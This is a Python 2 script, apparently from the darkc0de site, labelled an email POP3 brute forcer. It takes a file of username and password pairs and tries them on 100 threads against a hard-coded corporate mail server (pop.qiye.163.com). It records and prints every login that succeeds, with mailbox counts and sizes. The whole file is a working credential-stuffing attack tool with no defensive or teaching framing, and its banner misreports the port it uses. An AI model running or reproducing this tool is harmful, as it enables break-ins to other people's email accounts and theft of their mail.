# -*- coding:utf-8 -*-
#!usr/bin/python 
#Email Pop3 Brute Forcer 
#http://www.darkc0de.com 
#d3hydr8[at]gmail[dot]com 
#http://www.nxadmin.com 

import random, poplib 
from copy import copy 
import os
import Queue
import sys
import threading
import time
import datetime
import codecs



class Worker(threading.Thread):    # 处理工作请求
    def __init__(self, workQueue, resultQueue, **kwds):
        threading.Thread.__init__(self, **kwds)
        self.setDaemon(True)
        self.workQueue = workQueue
        self.resultQueue = resultQueue


    def run(self):
        while 1:
            try:
                callable, args, kwds = self.workQueue.get(False)    # get task
                res = callable(*args, **kwds)
                self.resultQueue.put(res)    # put result
            except Queue.Empty:
                break

class WorkManager:    # 线程池管理,创建
    def __init__(self, num_of_workers=10):
        self.workQueue = Queue.Queue()    # 请求队列
        self.resultQueue = Queue.Queue()    # 输出结果的队列
        self.workers = []
        self._recruitThreads(num_of_workers)

    def _recruitThreads(self, num_of_workers):
        for i in range(num_of_workers):
            worker = Worker(self.workQueue, self.resultQueue)    # 创建工作线程
            self.workers.append(worker)    # 加入到线程队列


    def start(self):
        for w in self.workers:
            w.start()

    def wait_for_complete(self):
        while len(self.workers):
            worker = self.workers.pop()    # 从池中取出一个线程处理请求
            worker.join()
            if worker.isAlive() and not self.workQueue.empty():
                self.workers.append(worker)    # 重新加入线程池中
        print 'All jobs were complete.'


    def add_job(self, callable, *args, **kwds):
        self.workQueue.put((callable, args, kwds))    # 向工作队列中加入请求

    def get_result(self, *args, **kwds):
        return self.resultQueue.get(*args, **kwds)




 


def mailbruteforce(user): 
	user = user.split('----')
	value = user[1]
	user = user[0]
       
	try: 
		print "-"*12 
		 
		print "[+] User:",user,"Password:",value 
		time.sleep(2) 
		pop = poplib.POP3(server,110) 
		pop.user(user) 
		auth = pop.pass_(value) 
		print auth 
		if auth.split(' ')[0]!= "+OK" : 
		  pop.quit() 
		  print "unknown error !" 
		   
		if pop.stat()[1] is None or pop.stat()[1] < 1 : 
		  pop.quit() 
		  print "unknown error !" 
		   
		print "\t\t\n\nLogin successful:",user, value 
		print "\t\tMail:",pop.stat()[0],"emails" 
		print "\t\tSize:",pop.stat()[1],"bytes\n\n" 
		ret = (user,value,pop.stat()[0],pop.stat()[1]) 
		success.append(ret) 
		#print len(success) 
		pop.quit() 
		 
	except: 
		#print "An error occurred:", msg 
		pass 





if len(sys.argv) !=2: 
	print "\n\t   EmailPopBruteForcer v1.0" 
	print "\t   --------------------------------------------------\n" 
	print "\t    Usage: ./qmailpopbrute.py <file>\n" 
	sys.exit(1) 
   
   
   
server = "pop.qiye.163.com" 
success = [] 
num_of_threads = 100
wm = WorkManager(num_of_threads)

try: 
	users = open(sys.argv[1], "r").readlines() 
except(IOError): 
	print "[-] Error: Check your file path\n" 
	sys.exit(1) 	


try: 
	pop = poplib.POP3(server,110) 
	welcome = pop.getwelcome() 
	print welcome 
	pop.quit() 
except (poplib.error_proto): 
	welcome = "No Response" 
	pass
	

	
print "\n\t EmailPopBruteForcer v1.0" 
print "\t   --------------------------------------------------\n" 
print "[+] Server:",server 
print "[+] Port: 995" 
print "[+] Users Loaded:",len(users) 
print "[+] Server response:",welcome,"\n" 
print "[+] Working threads:" + str(num_of_threads)

	

for user in users:
	user = user.replace('\n','')
	user = user.replace('\r','')
	wm.add_job(mailbruteforce, user)

	
wm.start()
wm.wait_for_complete()
	

	
